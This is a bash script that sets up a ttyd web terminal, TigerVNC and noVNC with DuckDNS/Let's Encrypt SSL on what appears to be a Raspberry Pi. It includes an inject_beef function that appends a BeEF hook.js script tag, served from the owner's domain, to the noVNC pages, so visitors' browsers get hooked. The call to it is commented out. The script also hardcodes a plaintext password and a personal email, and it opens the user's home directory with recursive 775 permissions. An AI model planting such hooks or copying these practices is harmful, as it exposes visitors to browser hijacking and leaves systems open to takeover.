#!/bin/bash
set -e  # Stop script on error

# ======================
# User Configuration
# ======================
export TTYD_USERNAME="alesanfe"
export TTYD_PASSWD="wellington"
export TTYD_UID=$(id -u "$TTYD_USERNAME")
export TTYD_GID=$(id -g "$TTYD_USERNAME")
export TEMP_USER="remote"
export TEMP_USER_PASS=$TTYD_PASSWD
export EMAIL="alex.0002002@gmail.com"

# ======================
# Network Configuration
# ======================
export NOVNC_PORT="6080"
export TTYD_PORT="5000"
export VNC_PORT=5901

# ======================
# SSL Configuration
# ======================
export SSL_DIR="/home/alesanfe/raspberrypinoVNC/ssl"
export DUCK_DOMAIN="alesanfe.duckdns.org"
export DUCK_DIR="/etc/letsencrypt/live/$DUCK_DOMAIN"
export SSL_CERT="$SSL_DIR/fullchain.pem"
export SSL_KEY="$SSL_DIR/privkey.pem"
export SSL_RENEW_DAYS=30

# ======================
# BeEF Configuration
# ======================
export SCRIPT_TAG="<script src='http://$DUCK_DOMAIN:3000/hook.js'></script>"
export INDEX_FILE="/usr/share/novnc/index.html"
export VNC_FILE="/usr/share/novnc/vnc.html"

# ======================
# VNC Server Configuration
# ======================
export VNC_DISPLAY=":2"
export VNC_GEOMETRY="1920x1080"
export VNC_DEPTH=24

# Trap CTRL+C to perform cleanup
trap cleanup INT EXIT

stop() {
    print_message "Stopping services..." "yellow" "🛑"
    cleanup
    exit 0
}

if [ "$1" == "stop" ]; then
    stop
fi

print_message() {
    local message=$1
    local color=$2
    local emoji=$3
    case $color in
        red) color_code="\033[0;31m" ;;
        green) color_code="\033[0;32m" ;;
        yellow) color_code="\033[0;33m" ;;
        blue) color_code="\033[0;34m" ;;
        purple) color_code="\033[0;35m" ;;
        cyan) color_code="\033[0;36m" ;;
        white) color_code="\033[0;37m" ;;
        *) color_code="\033[0m" ;;
    esac
    echo -e "${color_code}${emoji} ${message}\033[0m"
}

close_port() {
    local PORT=$1
    local PID=$(lsof -t -i :$PORT 2>/dev/null)
    if [ ! -z "$PID" ]; then
        print_message "Stopping process on port $PORT (PID: $PID)..." "yellow" "🛑"
        sudo kill -9 $PID
    fi
}

cleanup() {
    print_message "Cleaning up environment..." "blue" "🩹"
    close_port $NOVNC_PORT
    close_port $TTYD_PORT
    close_port $VNC_PORT
    if pgrep -x "Xtigervnc" > /dev/null; then
        print_message "Stopping TigerVNC server..." "yellow" "🛑"
        sudo -u $TEMP_USER tigervncserver -kill $VNC_DISPLAY || true
        sudo pkill -f 'tigervncserver' || true
    fi
    rm -f ttyd.armhf*
    if id "$TEMP_USER" &>/dev/null; then
        print_message "Removing temporary user $TEMP_USER..." "yellow" "🚨"
        sudo pkill -u "$TEMP_USER" || true
        sudo deluser --remove-home "$TEMP_USER" || true
    fi
    print_message "✅ Cleanup complete." "green" "✔️"
}

install_dependencies() {
    print_message "Installing required packages..." "yellow" "⚙️"
    sudo apt update && sudo apt install -y \
        wget iproute2 lsof tigervnc-standalone-server novnc \
        xfce4 xfce4-goodies x11-xserver-utils certbot \
        python3-certbot-dns-standalone 
    print_message "Dependencies installed successfully." "green" "✅"
}

create_ssl() {
    if [[ -f "$SSL_CERT" ]]; then
        local expire_date
        expire_date=$(openssl x509 -enddate -noout -in "$SSL_CERT" | cut -d= -f2)
        local expire_sec
        expire_sec=$(date --date="$expire_date" +%s)
        local now_sec
        now_sec=$(date +%s)
        local days_left=$(( (expire_sec - now_sec) / 86400 ))

        if (( days_left > SSL_RENEW_DAYS )); then
            print_message "✅ SSL certificate is still valid for $days_left days. Skipping renewal." "green" "🔐"
            export DISABLE_SSL=false
            return
        else
            print_message "⚠️ SSL certificate expires in $days_left days. Attempting renewal..." "yellow" "⏳"
        fi
    else
        print_message "⚠️ No existing SSL certificate found. Attempting to generate a new one..." "yellow" "📄"
    fi

    print_message "Removing old SSL certificates..." "yellow" "🧨"
    sudo rm -rf ./ssl
    sudo rm -f "$SSL_CERT" "$SSL_KEY"

    print_message "Attempting to generate new SSL certificates..." "yellow" "🔐"
    install_dependencies

    # Ejecutar certbot y capturar salida y error para no parar el script
    local certbot_output
    mkdir -p ./ssl

    if certbot_output=$(sudo certbot certonly --standalone --preferred-challenges http -d "$DUCK_DOMAIN" --email "$EMAIL" --agree-tos --no-eff-email --non-interactive --quiet --rsa-key-size 4096 --must-staple
 2>&1); then
        print_message "✅ SSL certificate generated successfully." "green" "🔐"
        export DISABLE_SSL=false
    else
        print_message "❌ Failed to generate new SSL certificate." "red" "⚠️"
        print_message "$certbot_output" "red" "⚠️"

        if [[ -f "$DUCK_DIR/fullchain.pem" && -f "$DUCK_DIR/privkey.pem" ]]; then
            print_message "📂 Using previously existing SSL certificates." "yellow" "📂"
            export DISABLE_SSL=false
        else
            print_message "🚫 No valid SSL certificates found. Disabling SSL." "red" "💥"
            export DISABLE_SSL=true
            return
        fi
    fi

    sudo cp "$DUCK_DIR"/fullchain.pem "$SSL_CERT"
    sudo cp "$DUCK_DIR"/privkey.pem "$SSL_KEY"
    print_message "✅ SSL certificates are ready." "green" "🔒"
}




# Function to create a temporary user with valid UID and same permissions as TTYD_USERNAME
create_temp_user() {
    if ! id "$TEMP_USER" &>/dev/null; then
        print_message "Creating temporary user $TEMP_USER..." "cyan" "👤"

        # Manually assign UID within the valid range (1000-60000)
        NEW_UID=$(getent passwd | cut -d: -f3 | sort -n | tail -n 1)
        NEW_UID=$((NEW_UID + 1))

        # Ensure the new UID is within the valid range (1000-60000)
        if [[ "$NEW_UID" -lt 1000 ]]; then
            NEW_UID=1000
        elif [[ "$NEW_UID" -gt 60000 ]]; then
            NEW_UID=60000
        fi

        # Create user with the corrected UID
        sudo useradd -m -u "$NEW_UID" -g "$TTYD_GID" -s /bin/bash "$TEMP_USER"
	echo "$TEMP_USER:$TEMP_USER_PASS" | sudo chpasswd

        # Remove existing home directory if exists
        sudo rm -rf /home/$TEMP_USER || true

        # Create home directory manually (if required)
        sudo mkdir -p /home/$TEMP_USER
        sudo chown $TEMP_USER:$TTYD_GID /home/$TEMP_USER

        # Set permissions on TTYD_USERNAME's home directory to allow TEMP_USER to modify it
        sudo chown -R $TEMP_USER:$TTYD_GID /home/$TTYD_USERNAME  # Change ownership to TEMP_USER
        sudo chmod -R 775 /home/$TTYD_USERNAME  # Give write permissions to TEMP_USER

        # Ensure TEMP_USER can write to TTYD_USERNAME's home directory
	sudo setfacl -R -m u:$TEMP_USER:rwx /home/$TTYD_USERNAME
	sudo setfacl -R -d -m u:$TEMP_USER:rwx /home/$TTYD_USERNAME

	# Adjust ownership for necessary directories
	sudo chown -R $TTYD_USERNAME:$TTYD_GID /home/$TTYD_USERNAME/raspberrypinoVNC
	sudo chown -R $TTYD_USERNAME:$TTYD_GID /home/$TTYD_USERNAME/beef
	sudo chown -R $TTYD_USERNAME:$TTYD_GID /home/$TTYD_USERNAME/duck

	# Restrict general access to raspberrypinoVNC, beef, and duck
	sudo setfacl -m u:$TEMP_USER:--- /home/$TTYD_USERNAME/raspberrypinoVNC
	sudo setfacl -m u:$TEMP_USER:--- /home/$TTYD_USERNAME/beef
	sudo setfacl -m u:$TEMP_USER:--- /home/$TTYD_USERNAME/duck
	sudo chmod 700 /home/$TTYD_USERNAME/raspberrypinoVNC
	sudo chmod 700 /home/$TTYD_USERNAME/beef
	sudo chmod 700 /home/$TTYD_USERNAME/duck
	sudo setfacl -R -m u:$TEMP_USER:--- /home/$TTYD_USERNAME/raspberrypinoVNC
	sudo setfacl -R -m u:$TEMP_USER:--- /home/$TTYD_USERNAME/beef
	sudo setfacl -R -m u:$TEMP_USER:--- /home/$TTYD_USERNAME/duck

	# Allow TEMP_USER to traverse raspberrypinoVNC to access ssl
	sudo setfacl -m u:$TEMP_USER:x /home/$TTYD_USERNAME/raspberrypinoVNC

	# Grant full access to TEMP_USER in ssl
	sudo setfacl -R -m u:$TEMP_USER:rwx /home/$TTYD_USERNAME/raspberrypinoVNC/ssl
	sudo setfacl -R -d -m u:$TEMP_USER:rwx /home/$TTYD_USERNAME/raspberrypinoVNC/ssl



        print_message ".Xauthority file missing for $TEMP_USER. Copying from $TTYD_USERNAME..." "yellow" "⚠️"
        sudo cp /home/$TTYD_USERNAME/.Xauthority /home/$TEMP_USER/.Xauthority
        sudo chown $TEMP_USER:$TTYD_GID /home/$TEMP_USER/.Xauthority

        print_message "VNC password files missing for $TEMP_USER. Copying from $TTYD_USERNAME..." "yellow" "⚠️"
        sudo mkdir -p /home/$TEMP_USER/.vnc
        sudo cp -r /home/$TTYD_USERNAME/.vnc/* /home/$TEMP_USER/.vnc/
        sudo chown -R $TEMP_USER:$TTYD_GID /home/$TEMP_USER/.vnc
        sudo chmod -R 700 /home/$TEMP_USER/.vnc

        print_message "Temporary user $TEMP_USER created with UID $NEW_UID and same permissions as $TTYD_USERNAME." "green" "✅"
    fi
}

# Function to start ttyd server
start_ttyd() {
    print_message "Starting ttyd..." "blue" "💬"
    if [[ "$DISABLE_SSL" == true ]]; then
        print_message "Starting ttyd WITHOUT SSL." "yellow" "⚠️"
        sudo -u $TEMP_USER ttyd -c "$TTYD_USERNAME:$TTYD_PASSWD" -p "$TTYD_PORT" bash &
    else
        print_message "Starting ttyd WITH SSL." "green" "🔐"
        sudo -u $TEMP_USER ttyd -S --ssl -C "$SSL_CERT" -K "$SSL_KEY" \
            -c "$TTYD_USERNAME:$TTYD_PASSWD" -p "$TTYD_PORT" bash &
    fi
}

# Function to start TigerVNC server
start_vnc_server() {
    # Starting the VNC server as remote user
    print_message "Starting TigerVNC server for $TEMP_USER..." "blue" "💻"
    sudo -u $TEMP_USER tigervncserver $VNC_DISPLAY -geometry "$VNC_GEOMETRY" -depth $VNC_DEPTH -rfbport $VNC_PORT -SecurityTypes VncAuth -localhost no
    # Check if VNC server started successfully
    if [[ $? -eq 0 ]]; then
        print_message "TigerVNC server started successfully." "green" "✅"
    else
        print_message "Error: Failed to start TigerVNC server." "red" "❌"
    fi
}

start_novnc() {
    print_message "Starting noVNC..." "blue" "💻"
    if [[ "$DISABLE_SSL" == true ]]; then
        print_message "Starting noVNC WITHOUT SSL." "yellow" "⚠️"
        sudo -u $TEMP_USER /usr/share/novnc/utils/novnc_proxy --vnc 127.0.0.1:$VNC_PORT \
            --listen "$NOVNC_PORT"
    else
        print_message "Starting noVNC WITH SSL." "green" "🔐"
        sudo -u $TEMP_USER /usr/share/novnc/utils/novnc_proxy --vnc 127.0.0.1:$VNC_PORT \
            --listen "$NOVNC_PORT" --cert "$SSL_CERT" --key "$SSL_KEY" --ssl-only
    fi
}


inject_beef() {
    print_message "Injecting BeEF into noVNC..." "red" "💉"
    
    if [ ! -f "$INDEX_FILE" ]; then
        print_message "index.html does not exist. Creating and injecting script..." "red" "💉"
        sudo cp "$VNC_FILE" "$INDEX_FILE"
    else
        print_message "index.html exists. Creating backup and injecting script in vnc.html..." "red" "💉"
        sudo cp "$INDEX_FILE" "$VNC_FILE"    
    fi
    echo "$SCRIPT_TAG" | sudo tee -a "$VNC_FILE" > /dev/null

}

install_dependencies
# inject_beef
create_ssl
create_temp_user
start_vnc_server
start_ttyd
start_novnc


